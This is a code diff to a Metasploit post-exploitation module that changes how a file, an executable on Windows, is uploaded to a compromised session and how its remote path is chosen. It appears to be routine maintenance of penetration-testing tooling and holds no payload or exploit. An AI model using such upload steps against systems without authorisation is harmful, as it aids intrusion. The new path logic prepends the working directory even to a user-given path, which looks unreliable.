@@ -52,8 +52,10 @@ class MetasploitModule < Msf::Post
     end
 
     tmprpath = rpath
-    session.fs.file.upload_file(tmprpath, script_path) do |step, src, dst|
-      print_status_redis("#{step.ljust(11)}: #{src} -> #{dst}")
+    unless session.fs.file.exist?(tmprpath)
+      session.fs.file.upload_file(tmprpath, script_path) do |step, src, dst|
+        print_status_redis("#{step.ljust(11)}: #{src} -> #{dst}")
+      end
     end
 
     if session.platform == 'windows'
@@ -104,16 +106,20 @@ class MetasploitModule < Msf::Post
     datastore['LPATH']
   end
 
+  # datastore['RPATH'].blank? ? get_env('TEMP') + filename : datastore['RPATH']
+  # datastore['RPATH'].blank? ? session.fs.dir.pwd + filename : datastore['RPATH']
+
   def rpath
-    if session.platform == "windows"
-      filename = '/' + Time.now.to_i.to_s + ".exe"
-      # datastore['RPATH'].blank? ? get_env('TEMP') + filename : datastore['RPATH']
+    if datastore['RPATH'].blank?
+      if session.platform == "windows"
+        filename = '/' + Time.now.to_i.to_s + ".exe"
+      else
+        filename = '/' + Time.now.to_i.to_s
+      end
     else
-      filename = '/' + Time.now.to_i.to_s
-      # datastore['RPATH'].blank? ? session.fs.dir.pwd + filename : datastore['RPATH']
+      filename = datastore['RPATH']
     end
-    # filename = '/' + Time.now.to_i.to_s
-    datastore['RPATH'].blank? ? session.fs.dir.pwd + filename : datastore['RPATH']
+    session.fs.dir.pwd + filename
   end
 
   def args
